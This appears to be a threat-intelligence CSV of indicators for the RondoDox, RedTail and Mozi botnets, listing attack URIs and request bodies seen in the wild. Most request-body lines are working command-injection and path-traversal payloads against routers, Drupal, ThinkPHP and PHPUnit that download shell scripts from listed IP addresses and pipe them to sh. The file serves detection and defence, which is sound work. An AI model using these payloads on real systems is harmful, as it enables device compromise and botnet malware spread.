Threat,Indicator Type,Indicator
RondoDox,URI,/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
RondoDox,URI,/cgi-bin/cgi_main.cgi
RondoDox,URI,/cgi-bin/login.cgi
RondoDox,URI,/cgi-bin/server/server.cgi?func=server02_main_submit&counter=5.22497857400916&TEST_BTN4=
RondoDox,URI,/index.php?s=captcha
RondoDox,URI,/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
RondoDox,URI,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
RondoDox,URI,/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
RondoDox,URI,/cgi-bin/cgi_main.cgi
RondoDox,URI,/cgi-bin/login.cgi
RondoDox,URI,/cgi-bin/server/server.cgi?func=server02_main_submit&counter=5.22497857400916&TEST_BTN4=
RondoDox,URI,/index.php?s=captcha
RondoDox,URI,/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
RondoDox,URI,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
RondoDox,URI,/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh
RondoDox,URI,/cgi-bin/cgi_main.cgi
RondoDox,URI,/cgi-bin/login.cgi
RondoDox,URI,/cgi-bin/server/server.cgi?func=server02_main_submit&counter=5.22497857400916&TEST_BTN4=
RondoDox,URI,/index.php?s=captcha
RondoDox,URI,/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax
RondoDox,URI,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
RondoDox,Request Body,(wget -qO- http://74.194.191.52/rondo.dgx.sh||busybox wget -qO- http://74.194.191.52/rondo.dgx.sh||curl -s http://74.194.191.52/rondo.dgx.sh)|sh&
RondoDox,Request Body,<?php system('(wget -qO- http://74.194.191.52/rondo.dtm.sh||busybox wget -qO- http://74.194.191.52/rondo.dtm.sh||curl -s http://74.194.191.52/rondo.dtm.sh)|sh&'); ?>
RondoDox,Request Body,_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Cbusybox%20wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.txg.sh%29%7Csh
RondoDox,Request Body,cgiName=time_tzsetup.cgi&page=%2Fcfg_system_time.htm&id=69&ntp=%60curl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.qyt.sh%7Csh%60&ntp1=time.stdtime.gov.tw&ntp2=%60%60&isEnabled=0&timeDiff=%2B9&ntpAutoSync=1&ntpSyncMode=1&day=0&hour=0&min=0&syncDiff=30
RondoDox,Request Body,form_id=user_register_form&_drupal_ajax=1&mail%5B%23post_render%5D%5B%5D=exec&mail%5B%23type%5D=markup&mail%5B%23markup%5D=%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.bxf.sh%7C%7Ccurl%20-s%20http%3A%2F%2F74.194.191.52%2Frondo.bxf.sh%29%7Csh%26
RondoDox,Request Body,page=login&newUI=0&username=admin&password=password&hostname=localhost&ipaddr=127.0.0.1&homepage=index&sysinitpage=index&wizardpage=index&login_page=index&lang_select=0&langChange=0&key=%27%20%60wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.rtg.sh%7Csh%60%20%23
RondoDox,Request Body,time_mode=0&time_YEAR=0&time_MONTH=0&time_DAY=0&time_HOUR=0&time_MINUTE=0&time_SECOND=0&TIMEZONE=50&year=&month=&day=&CONFIGURE_NTP=on&SPECIFIC_SERVER=%24%28wget%20-qO-%20http%3A%2F%2F74.194.191.52%2Frondo.qbq.sh%7Csh%29&CONFIGURE_NTP_SYNC_BY_PRESET_TIME=on&SYNC_PRESET_TIME_HOURS=0
RedTail,Request Body,cd /tmp || cd /var/tmp; curl http://178.16.55.224/sh -o redtail.sh || wget http://178.16.55.224/sh -O redtail.sh; chmod +x redtail.sh; ./redtail.sh apache.selfrep; rm -rf redtail.sh
RedTail,URI,:443/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
RedTail,URI,:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
RedTail,URI,:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
RedTail,URI,:80/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
RedTail,URI,:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
RedTail,URI,87.106.45.158:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
Mozi,URI,127.0.0.1:80/GponForm/diag_Form?images/
Mozi,Request Body,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://103.93.93.211:57493/Mozi.m+-O+->/tmp/gpon80;
Mozi,Request Body,XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://219.71.91.175:43157/Mozi.m+-O+->/tmp/gpon80;